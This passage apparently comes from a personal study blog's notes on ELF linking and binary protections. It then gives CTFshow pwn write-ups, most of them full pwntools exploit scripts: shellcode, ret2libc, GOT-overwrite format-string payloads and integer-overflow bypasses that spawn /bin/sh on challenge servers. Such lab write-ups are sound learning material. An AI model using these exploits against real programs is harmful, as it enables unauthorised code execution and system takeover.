CHECK_INT(waitlist-\u0026gt;count, \u0026gt;= 0); CHECK_INT(pid, \u0026lt; MAX_PROCS); CHECK_HEAP(ctx-\u0026gt;rip); CHECK_HEAP(ctx-\u0026gt;cr3); 检查PID，是否在堆区\n死锁：线程互相等待\n","date":"2025-03-16T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/jyy%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"jyy操作系统"},{"content":"gcc hello.c -save-temps \u0026ndash;verbose\n-save-temps保存中间生成文件\n\u0026ndash;verbose查看详细工具流\n预处理 gcc -E hello.c -o hello.i\n编译 gcc -S hello.c -o hello.s\n汇编 gcc -c hello.s -o hello.o\n重定向文件\n反汇编\nobjdump -sd hello.o -M intel\n链接 gcc hello.o -o hello -static\n默认动态，-static指定静态链接\nobjdump -sd hello -M intel\n-M intel\n指定反汇编的输出格式为 Intel 语法（而不是默认的 AT\u0026amp;T 语法）。 Intel 语法是汇编语言的一种常见格式，通常更易于阅读。 -s 选项\n显示文件的完整内容（包括十六进制和 ASCII 表示）。 例如，它会显示每个段的十六进制数据以及对应的 ASCII 字符。 -d 选项\n反汇编文件中的可执行代码段。 例如，它会将二进制代码转换为汇编指令。 ELF文件 可执行文件.exec\n可重定位文件，尚未链接 .rel\n共享目标文件：动态链接库文件.dyc\n结构 文件头 节头表 .text\n.data\n.bss\n可执行文件的装载 运行一个可执行文件时，需要将该文件和动态链接库装载到进程空间中，形成一个进程镜像，每个进程都拥有独立的虚拟地址空间，这个空间日和布局是由记录在段头表的程序头决定的\n地址空间分配 相似节合并\n静态链接的详细过程 符号解析：每个符号（函数，变量）与定义关联\n重定位：每个符号定义与内存地址关联\n静态链接库：.a\n动态链接 在运行或加载时，在内存中完成链接的过程，用于动态连接的系统库叫共享库\n如funcq.elf和func2.elf不再包含单独的testlib.o，运行func1.elf时，系统将func1.elf和依赖的testlib.o装载如内存，然后进行动态链接，完成后系统将控制权交给程序入口点，当func2.elf想要执行时，由于内存中已经有testlib.o,因此不再重复加载\nStack Canaries canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的地方，攻击者要想控制函数的返回指针，就一定要先覆盖到canary,如果被改变，则认为是发生了栈溢出\ngcc默认使用stack canary保护，关闭方法加入“-fno-stack-protector”\nNX 开启NX保护不能直接使用shellcode执行任意代码，gcc默认开启，关闭方法加-z execstack\nASLR 将程序的堆栈地址和动态链接库的加载地址进行一定的随机化，这些地址之间是不可读写执行的未映射内存，降低攻击者对程序内存结构的了解程序\n关闭方式，修改/proc/sys/kernel/randomize_va_space文件的内容为0\nPIE 让ELF地址随机化加载，使得程序的内存结构对攻击者未知，进一步提高程序的安全性\n开启-fpic-pie\n关闭-no-pie\nFull Relro 开启“-z relro”\n.GOT.PLT和.PLT的作用 一个程序想调用动态链接库中的函数，必须使用.GOT.PLT和.PLT配合完成调用\n.PLT表是一段代码，从内存中取出一个地址然后跳转\n.GOT.PLT表存放实际地址\n由于Linux的Lazy binding机制，没有开启Full Rello的ELF种，某个函数必须被调用，.GOT.PLT表才会存放函数的真实地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int __cdecl main(int argc, const char **argv, const char **envp)`: 这是 `main` 函数的定义，它接受三个参数，分别是程序的参数数量 `argc`、参数列表 `argv` 和环境变量 `envp v6 = __readfsqword(0x28u);: 这一行读取了 FS 寄存器偏移 0x28 处的值并存储到 v6 中 setvbuf(_bss_start, 0LL, 2, 0LL); 和 setvbuf(stdin, 0LL, 2, 0LL);: 这两行调用了 setvbuf 函数，用于设置缓冲区类型。第一个调用将 _bss_start 的缓冲区类型设置为无缓冲，第二个调用将标准输入的缓冲区类型设置为无缓冲。 strcpy(s1, \u0026#34;CTFshowPWN\u0026#34;);: 这行将字符串 \u0026#34;CTFshowPWN\u0026#34; 复制到 s1 数组中 if ( !strcmp(s1, s2) ) execve_func();: 这行使用 strcmp 函数比较 s1 和 s2 是否相等，如果相等，则调用 execve_func 函数。 setvbuf: 这个函数用于设置文件流的缓冲区类型。它允许程序员控制标准 I/O 库中文件流的缓冲方式。通常，我们可以将文件流设置为无缓冲、行缓冲或全缓冲。在这个代码中，setvbuf 函数被用于设置 _bss_start 和标准输入流 stdin 的缓冲类型为无缓冲，这意味着每次输出都会立即被写入，而不会先缓存在内存中。 strcpy: 这个函数用于将一个字符串复制到另一个字符串数组中。它接受两个参数，第一个参数是目标字符串数组，第二个参数是源字符串。strcpy 会将源字符串的内容逐个字符地复制到目标字符串数组中，直到遇到源字符串的结束符 \\0。 puts: puts 函数用于向标准输出打印字符串，并在最后自动添加一个换行符 \\n。它接受一个字符串作为参数，并将其打印到标准输出流中。 scanf: 这个函数用于从标准输入流中读取输入。它接受格式化字符串作为第一个参数，用于指定输入的格式，以及一系列指向变量的指针，用于存储读取到的值。在这个代码中，scanf 被用于从标准输入中读取一个字符串，并将其存储到 s2 字符数组中。 strcmp: 这个函数用于比较两个字符串是否相等。它接受两个字符串作为参数，并返回一个整数值，如果两个字符串相等则返回0，否则返回它们第一个不相等字符的 ASCII 差值。在这个代码中，strcmp 用于比较 s1 和 s2 是否相等，如果相等则返回0，程序将执行 execve_func 函数。 execve(\u0026#34;/bin/sh\u0026#34;, argv, 0LL);: 这一行调用了 execve 函数，用于执行一个程序。它接受三个参数，分别是要执行的程序路径、参数列表和环境变量列表。在这里，它执行了 /bin/sh，并传递了一个空的参数列表和环境变量列表，表示没有额外的参数和环境变量。 IDA转换数据：C（转换为代码）、D（转换为数据）、A（转换为字符）、N（为标签重命名)\nchecksec查看文件信息\nread()读取\nstrcat()赋值\nsystem()调用\necho\u0026raquo;在文件后面追加内容\necho\u0026gt;覆盖文件\nfork()创建了子进程，fclose(_bss_star)关闭了输出流，即使后面再输入，也不会有回显，在命令后加上\u0026gt;\u0026amp;0 ，将命令的输出重定向到标准输入，也就是将命令的输出内容发送到与终端或键盘关联的地方\n链接重定位 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .text ... // 调用printf的call指令 call printf_stub ... printf_stub: mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址 jmp rax // 跳过去执行printf函数 .data ... printf函数的储存地址： 这里储存printf函数重定位后的地址 .got和.got.plt是否可写与RELRO有关，这是linux系统下可执行文件的一种保护机制，它用于增强程序的安全性，特别是针对共享库的攻击。RELRO机制通过将部分ELF段标记为只读，防止攻击者利用全局偏移表（GOT）和过程链接表（PLT）进行攻击。规定如下：\n当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。 当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。 当RELRO为No RELRO时，表示.got与.got.plt都可写。\n可以通过checksec命令来获取可执行文件的部分保护机制信息。\n可以通过readelf -S命令查看文件的各个段的详细信息，其中就包括了.got和.got.plt表的地址 用objdump -h pwn命令查看elf头信息，VMA即地址（虚拟地址和物理地址相同)\n只要传参src，长度大于0x3Eh+0x4就会发生溢出,使用./(file)传参\npwn24 调用read函数，读取输入，存入[ebp+buf]中，lea eax [ebp+buf]把地址存入eax中，然后，call eax执行\nNX是disables，说明可以用shellcode进行攻击\n1 2 3 4 5 from pwn import * p=remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;,28284)#与服务器的pwn文件建立联系 shell=asm(shellcraft.sh())#利用shellcraft模块生成调用系统shell（/bin/sh）的shellcode。这个shellcode可以用于执行命令行命令 p.sendline(shell)#向远程发送shellcode p.interactive()#建立交互式对话 就获得控制台权限了\npwn25 ret2libc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; p = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28162) elf = ELF(\u0026#39;pwn1\u0026#39;) offset = 0x88 + 0x4 puts_plt = elf.symbols[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] # payload：0x88+0x4个无用填充字符覆盖到返回地址， # 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数， # main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞 # puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址 payload = b\u0026#39;a\u0026#39; * offset + p32(puts_plt) + p32(main) + p32(puts_got) p.sendline(payload) # 接收puts函数输出的puts函数在内存的地址 puts_addr = u32(p.recv()[0:4]) print(hex(puts_addr)) # 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址 libc = LibcSearcher(\u0026#34;puts\u0026#34;,puts_addr) # 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址 libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) print(hex(libc_base)) # 使用libc.dump(\u0026#34;system\u0026#34;)找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址 system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # 使用libc.dump(\u0026#34;str_bin_sh\u0026#34;)找到libc中的\u0026#34;/bin/sh\u0026#34;字符串地址，再加上基地址就得到\u0026#34;/bin/sh\u0026#34;字符串在内存的地址 binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址 # 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4 # 最后填入system的参数“/bin/sh” payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) + b\u0026#39;a\u0026#39; * 4 + p32(binsh_addr) p.sendline(payload) p.recv() p.interactive() pwn26 SLR（Address Space Layout Randomization）是一种计算机安全机制，旨在增加恶意攻击者在系统上成功执行攻击的难度。ASLR通过随机化进程的地址空间布局来防止攻击者依赖于已知的内存地址，从而增加了攻击的复杂性。ASLR可以随机化以下组件的位置：\n栈：包含函数调用和局部变量的区域。 堆：用于动态分配内存的区域。 共享库：动态链接的共享库的加载地址。 代码段：包含程序指令的区域。 在 Linux 系统中，/proc/sys/kernel/randomize_va_space 是一个控制和查看ASLR的接口文件。\n/proc/sys/kernel/randomize_va_space 可以具有以下值：\n0：表示 ASLR 被禁用。在这种情况下，进程的地址空间将不会随机化，各个组件的地址位置将是固定的。\n1：表示 ASLR 已启用，但只会对共享库的地址进行随机化。即在每次运行时，共享库的加载地址会发生变化，而进程的栈、堆和代码段的地址位置仍然是固定的。\n2：表示 ASLR 已启用，对进程的地址空间中的所有组件（包括栈、堆、共享库和代码段）进行完全随机化。这是最安全的设置，因为每次运行时，进程的所有组件的地址位置都会发生变化。\npwn29 PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，大大增加了利用难度。然而在增加安全性的同时，PIE也会一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。 可以看到executable:后面输出的是main函数的地址，由于PIE保护，已经发生了变化\npwn30 溢出漏洞，用ret2libc,用于绕过栈溢出漏洞等缓冲区溢出漏洞的防御措施（比如NX防御机制），以实现代码执行或提升攻击者权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from pwn import * from LibcSearcher import * # 打印调试信息 context.log_level = \u0026#39;debug\u0026#39; # 建立连接 p = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28309\u0026#34;) elf = ELF(\u0026#34;./pwn\u0026#34;) # 溢出偏移地址 offset = 0x88 + 0x4 # main函数地址 main_addr = elf.symbols[\u0026#39;main\u0026#39;] # plt表中puts函数地址 puts_plt = elf.plt[\u0026#39;puts\u0026#39;] # got表中puts函数的地址 puts_got = elf.got[\u0026#39;puts\u0026#39;] # payload：0x88+0x4个无用填充字符覆盖到返回地址， # 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数， # main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞 # puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址 payload = offset * b\u0026#39;a\u0026#39; + p32(puts_plt) + p32(main_addr) + p32(puts_got) # 发送payload p.sendline(payload) # 接收puts函数输出的puts函数在内存的地址 puts_addr = u32(p.recv()[0:4]) print(hex(puts_addr)) # 根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址 libc = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) # 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址 libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) print(hex(libc_base)) # 使用libc.dump(\u0026#34;system\u0026#34;)找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址 system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # 使用libc.dump(\u0026#34;str_bin_sh\u0026#34;)找到libc中的\u0026#34;/bin/sh\u0026#34;字符串地址，再加上基地址就得到\u0026#34;/bin/sh\u0026#34;字符串在内存的地址 binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址 # 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4 # 最后填入system的参数“/bin/sh” payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) + b\u0026#39;a\u0026#39; * 4 + p32(binsh_addr) p.sendline(payload) p.interactive() 哎，有些难理解\npwn32 Fortify功能\n在使用FORTIFY_SOURCE功能的编译器环境中，当检测到潜在的缓冲区溢出或其他内存错误时，编译器会自动替换对应的不安全C库函数（例如strcpy，memcpy等）调用为更安全的版本。这些安全版本的函数在执行前会进行一些边界检查，以确保不会发生缓冲区溢出。\n此外，FORTIFY_SOURCE还会对格式化字符串函数（如printf、scanf等）的参数进行检查，以确保其格式化字符串参数与实际参数的类型匹配，从而避免格式化字符串漏洞。\n本质上一种检查和替换机制，对GCC和glibc的一个安全补丁，目前支持memcpy, memmove, memset, strcpy, strncpy, strcat, strncat,sprintf, vsprintf, snprintf, vsnprintf, gets等。\n·FORTIFY_SOURCE=0: 这是Fortify Source功能的默认级别，也就是禁用状态。\n·FORTIFY_SOURCE=1: 这是第一个启用级别。如果编译器在编译时检测到潜在的缓冲区溢出或其他内存错误，它将生成一个运行时检查的警告，但程序仍然会继续执行。例如，会将strcpy替换为__strcpy_chk，memcpy替换为__memcpy_chk等。\n·FORTIFY_SOURCE=2: 这是最高级别的启用。如果编译器在编译时检测到潜在的缓冲区溢出或内存错误，它将生成一个运行时检查的错误，并且程序的执行将被终止\nfgets(char *str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内，n是要读取的最大字符串长度\ngetgid()用来取得执行目前进程的组识别码\nstrtol() 函数将字符串转换为长整数值\n*(_QWORD *)作为一个整体，通常用于将一个地址（或其他整数）转换为一个指向64位无符号整数的指针，并获取该地址上的值。\nmemcpy(void *str1, const void *str2, size_t n) 从存储区 str2 复制 n 个字节到存储区 str1\n对函数的解释 main函数三个参数，argc是命令行参数的数量，argv是命令行字符串数组，envp是环境变量数组\nsetresgid(v3, v3, v3)：将当前进程的真实 GID、有效 GID 和保存的 GID 都设置为v3的值\nv4 = argv[1]：将第一个命令行参数赋值给 v4。 \\*(_QWORD \\*)buf1 = \\*(_QWORD \\*)v4：将 v4 的前 8 个字节复制到 buf1 中。（QWORD八个字节） \\*(_WORD \\*)\u0026amp;buf1[8] = \\*((_WORD \\*)v4 + 4)：将 v4 的第 9 和第 10 个字节复制到 buf1 的第 9 和第 10 个位置。（WORD两个字节） buf1[10] = v4[10]：将 v4 的第 11 个字节复制到 buf1 的第 11 个位置。 作用：将 argv[1] 的内容复制到 buf1 中。 处理命令行参数，将其复制到缓冲区中。 打印缓冲区内容。 从标准输入读取数据并打印。 检查命令行参数数量，如果超过 4 个，调用未定义函数。 pwn33 现在FORTIFY_SOURCE=1，即Fortify 功能已启用。附件是64位elf，用IDA打开，可以看到上题中的strcpy被替换为__strcpy_chk，memcpy被替换为__memcpy_chk，也加上了11LL的限制防止溢出，这是第一级Fortify的特征\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 `__memcpy_chk(buf1, argv[2], v5, 11LL)` 中： - **`buf1`**：目标缓冲区，数据将被复制到这里。 - **`argv[2]`**：源缓冲区，数据从这里复制（通常是命令行参数的第二个参数）。 - **`v5`**：要复制的字节数。 - **`11LL`**：目标缓冲区 `buf1` 的实际大小（11 字节）。 __memcpy_chk 的功能是将 argv[2] 中的 v5 个字节复制到 buf1 中，但在复制之前会检查目标缓冲区 buf1 的大小是否足够： 如果 v5 超过了 buf1 的大小（11 字节），__memcpy_chk 会触发缓冲区溢出保护机制，终止程序并输出错误信息。 如果 v5 小于或等于 buf1 的大小，则正常执行复制操作。 __strcpy_chk 的功能是将 argv[1] 中的字符串复制到 buf2 中，但在复制之前会检查目标缓冲区 buf2 的大小是否足够： 如果 argv[1] 的长度（包括字符串结束符 \\0）超过了 buf2 的大小（11 字节），__strcpy_chk 会触发缓冲区溢出保护机制，终止程序并输出错误信息。 如果 argv[1] 的长度小于或等于 buf2 的大小，则正常执行复制操作。 前者是带缓冲区的内存复制函数，后者是带缓冲区的字符串复制函数\npwn34 此时FORTIFY_SOURCE=2，启用了第二级Fortify，用IDA打开附件查看，此时printf函数也被替换成了__printf_chk，Undefined函数前的if条件也没了\npwn35 sprintf就是把格式化的数据写入到某个字符串中。返回值字符串的长度。\nfprintf()函数根据指定的format(格式)发送信息(参数)到由stream(流)指定的文件.因此fprintf()可以使得信息输出到指定的文件。\nstdout, stdin, stderr的中文名字分别是标准输出，标准输入和标准错误。\nstdout是行缓冲的，他的输出会放在一个buffer里面，只有到换行的时候，才会输出到屏幕。而stderr是无缓冲的，会直接输出，\nfflush()刷新缓冲区\n注意到signal(11, (__sighandler_t)sigsegv_handler);Signal 11错误，也称为“Segmentation fault”，是一种用于提示Unix系统程序出现错误的信号。当应用程序试图对无权访问的内存地址进行读写操作时,会调用 sigsegv_handler 函数,sigsegv_handler 函数 会把stderr打印输出,即将flag的值打印输出那么我们直接输入超长数据就会溢出，程序就会崩溃进而打印出flag strcpy函数（strcpy函数没有长度限制）这个函数是一个典型的可以用来利用溢出的函数。所以我们可以在这里进行栈溢出。\npwn36 仅开了RELRO\n危险函数gets()函数\n题目说了，利用后门函数，找到get_flag函数的位置，和偏移量0x28，ebp在s上面0x28处\n栈结构\n1 2 3 4 5 6 7 8 9 10 11 12 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---\u0026gt;+-----------------+ | | | | | | | | | | | | s,ebp-0x14--\u0026gt;+-----------------+ 覆盖后\n1 2 3 4 5 6 7 8 9 10 11 12 +-----------------+ | 0x0804843B | +-----------------+ | bbbb | ebp---\u0026gt;+-----------------+ | | | | | | | | | | | | s,ebp-0x14--\u0026gt;+-----------------+ exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * r =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28197) offset =0x28 flag_address = 0x08048586 payload = offset * b\u0026#39;a\u0026#39;+ b\u0026#39;bbbb\u0026#39;+ p32(flag_address) r.sendline(payload) r.interactive() pwn37 system(\u0026quot;/bin/sh\u0026quot;)调用默认shell来传入命令字符串，和上面一样\npwn38 64位，注意堆栈平衡！\n可以直接用gdb看汇编代码\ngdb pwn\ndisass backdoor\ncyclic 200\n填充字符串\ncyclic -l 地址\n看偏移，偏移量最后要加8（堆栈平衡）\nIDA中找ret地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28220\u0026#34;) offset = 0xa + 0x8 ret_addr = 0x0000000000400287 backdoor_addr = 0x0000000000400657 payload = offset * b\u0026#39;a\u0026#39; + p64(ret_addr) + p64(backdoor_addr) io.sendline(payload) io.interactive() pwn39 没有后门函数，但是有hint\n得到偏移量\n拿到/bin/sh的地址\n拿到system的地址\n1 objdump -d -j .plt pwn 查看IDA也可\n1 2 3 4 5 6 7 8 9 10 from pwn import * io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28241\u0026#34;) offset = 22 binsh_addr = 0x08048750 system_addr = 0x080483a0 payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) +b\u0026#39;bbbb\u0026#39;+ p32(binsh_addr) io.sendline(payload) io.interactive() 补充一下：代表是system函数的返回地址，由于不需要返回到某个地方，所以直接使用bbbb代替四个字节\npwn94 找到格式化字符串的位置\n1 2 aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x aaaa-ff9474a8-64-80486e5-1-0-61616161-2d78252d-252d7825-78252d78-2d78252d-252d7825 aaaa：这是一个固定的字符串，用于在栈上标记一个已知值（0x61616161，即aaaa的ASCII码）。 -%x：%x是格式化字符串中的占位符，用于以十六进制格式打印栈上的值。 验证：\n1 2 aaaa%6$p aaaa0x61616161 %6$p：这是一个格式化字符串占位符，表示打印栈上第6个位置的值（以指针格式）。\n拖进IDA反汇编，发现有sys函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./fmt\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28124) elf = ELF(\u0026#39;./pwn\u0026#39;) offset = 6 printf_got = elf.got[\u0026#39;printf\u0026#39;] system_plt = elf.plt[\u0026#39;system\u0026#39;] payload = fmtstr_payload(offset,{printf_got:system_plt}) io.sendline(payload) io.recv() io.sendline(\u0026#39;/bin/sh\\x00\u0026#39;) io.interactive() printf_got = elf.got['printf']:\n获取printf函数在GOT（Global Offset Table）中的地址。GOT表用于存储动态链接函数的实际地址。 system_plt = elf.plt['system']:\n获取system函数在PLT（Procedure Linkage Table）中的地址。PLT表用于调用动态链接的函数。 payload = fmtstr_payload(offset, {printf_got: system_plt}):\n使用pwntools的fmtstr_payload函数生成一个格式化字符串漏洞的利用载荷。这个载荷会将printf函数的GOT表项修改为system函数的地址。 offset是格式化字符串的偏移量。 {printf_got: system_plt}表示将printf_got地址处的值修改为system_plt。 io.sendline('/bin/sh\\x00')**:\n发送字符串/bin/sh给目标程序。由于printf的GOT表项已经被修改为system，因此当程序调用printf时，实际上会调用system('/bin/sh')，从而启动一个shell。 pwn95 与上一道题目不一样，没有了sys函数，需要去泄露libc，然后再修改GOT\n自动检测字符串偏移量\n1 2 3 4 5 6 def exec_fmt(payload): io.sendline(payload) info = io.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28291) elf = ELF(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/i386-linux-gnu/libc.so.6\u0026#39;) def exec_fmt(payload): io.sendline(payload) info = io.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset printf_got = elf.got[\u0026#39;printf\u0026#39;] payload = p32(printf_got) + (\u0026#39;%{}$s\u0026#39;.format(offset)).encode() io.send(payload) printf = u32(io.recv()[4:8]) system = printf - libc.sym[\u0026#39;printf\u0026#39;] + libc.sym[\u0026#39;system\u0026#39;] log.info(\u0026#34;system ===\u0026gt; %s\u0026#34; % hex(system)) // 通过printf函数的实际地址和libc库中的符号偏移量，计算出system函数的地址。 // printf - libc.sym[\u0026#39;printf\u0026#39;]：计算libc库的基地址。 // + libc.sym[\u0026#39;system\u0026#39;]：加上system函数的偏移量，得到system函数的实际地址。 // 使用log.info输出system函数的地址。 payload = fmtstr_payload(offset,{printf_got:system}) io.send(payload) //使用pwntools的fmtstr_payload函数生成一个格式化字符串漏洞的利用载荷。 // offset：格式化字符串的偏移量。 // {printf_got: system}：将printf_got地址处的值修改为system函数的地址。 //发送载荷，触发格式化字符串漏洞，修改printf的GOT表项为system函数的地址 io.send(\u0026#39;/bin/sh\u0026#39;) io.recv() io.interactive() pwn96 1 2 fgets(s, 64, stdin);//读取用户输入，最多64字节 printf(s);//这一行直接将用户控制的输入 s 作为 printf 的格式字符串。这是一个经典的格式字符串漏洞。攻击者可以通过在他们的输入中提供格式说明符（例如， %x 、 %s 、 %n ）来利用它： 为了修复这个漏洞，在调用 printf 时始终使用格式化字符串\n1 printf(\u0026#34;%s\u0026#34;, s); ctfshow{\u0026quot; 开头,转换为16进制就是 63 74 66 73 68\n6f 77 7b\n然后倒序就是 0x73667463 0x7b776f68,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 EXP \u0026#39;\u0026#39;\u0026#39;泄露栈中的字符串\u0026#39;\u0026#39;\u0026#39; from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28189) flag=b\u0026#39;\u0026#39; for i in range(6,6+12): payload=\u0026#39;%{}$p\u0026#39;.format(str(i)).encode() io.sendlineafter(b\u0026#39;$ \u0026#39;,payload) aim = unhex(io.recvuntil(b\u0026#39;\\n\u0026#39;,drop=True).replace(b\u0026#39;0x\u0026#39;,b\u0026#39;\u0026#39;)) flag += aim[::-1] print(flag.decode()) io.close() 注意所有部分都是字节对象！\n1 2 3 4 5 %{}p` 中的 `{}` 会被替换为当前的 `i` 值，例如 `%1p`、`%2p .replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;)：去掉返回数据中的 0x 前缀 unhex()将十六进制转换成字节 io.recvuntil(\u0026#39;\\n\u0026#39;, drop=True)：接收服务器返回的数据，直到遇到换行符 \\n，并丢弃换行符。 aim[::-1]逆向 pwn101 v4和v5初始化，输入两个整数，把它转换成无符号整数，并赋值给v4和v5，如果v4=0x80000000,v5=0x7FFFFFFF,给flag，但是要求输入十进制，快捷键’H‘转换数据类型\n1 2 3 4 5 from pwn import * io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28275) payload = \u0026#34;-2147483648 2147483647\u0026#34; io.sendlineafter(\u0026#34;Enter two intergers:\u0026#34;,payload) io.interative() pwn102 要求输入无符号整型，输入4294967295就行\npwn105 整形溢出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int __cdecl main(int argc, const char **argv, const char **envp) { char buf[1024]; // [esp+0h] [ebp-408h] BYREF int *p_argc; // [esp+400h] [ebp-8h] p_argc = \u0026amp;argc; init(); logo(); puts(\u0026#34;[+] Check your permissions:\u0026#34;); read(0, buf, 0x400u); ctfshow(buf); puts(\u0026#34;wtf\u0026#34;); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 char *__cdecl ctfshow(char *s) { char dest[8]; // [esp+7h] [ebp-11h] BYREF unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 \u0026lt;= 3u || v3 \u0026gt; 8u ) { puts(\u0026#34;Authentication failed!\u0026#34;); exit(-1); } printf(\u0026#34;Authentication successful, Hello %s\u0026#34;, s); return strcpy(dest, s); } unsigned __int8 v3 要求无符号8位整数\nstrcpy(dest, s) 将会复制8个字符加上一个空字符 \\0，总共9个字符，\n这里就是检查字符串长度，思考：如何bypass这个if条件\ndest的栈长度为0x11,缓冲区buf长度0x400，unsigned __int8 v3从0到255字节就截断，就是说256字节是0，257字节表示1，258字节表示3，可以利用这个条件构造payload，使payload长度足够长\npwn107 流程：先想如何绕过整数限制，泄露printf地址，计算libc基址，计算system和/bin/sh的地址，调用system(\u0026quot;/bin/sh\u0026quot;)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28167) elf = ELF(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/i386-linux-gnu/libc.so.6\u0026#39;) # 使用系统默认的 libc 文件路径 io.sendlineafter(b\u0026#39;read?\u0026#39;,b\u0026#39;-1\u0026#39;) io.recv() main = elf.symbols[\u0026#39;main\u0026#39;] printf_got = elf.got[\u0026#39;printf\u0026#39;] printf_plt = elf.plt[\u0026#39;printf\u0026#39;] payload = b\u0026#39;a\u0026#39;*(0x2c + 4)+p32(printf_plt) + p32(main) + p32(printf_got) io.sendline(payload) printf = u32(io.recv(4)) print(hex(printf)) libc_base = printf - libc.symbols[\u0026#39;printf\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] binsh = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) io.sendlineafter(b\u0026#39;read?\u0026#39;,b\u0026#39;-1\u0026#39;) io.recv() payload = b\u0026#39;a\u0026#39;*(0x2c + 4)+p32(system) + p32(main) + p32(binsh) io.sendline(payload) io.interactive() 思考：为什么是printf = u32(io.recv(4))，print(hex(printf))\n1 2 3 data = io.recv(4) # 返回 b\u0026#39;\\x7f\\x45\\x4c\\x46\u0026#39; printf = u32(data) # 解析为整数 0x464c457f print(hex(printf)) # 打印 0x464c457f pwn41 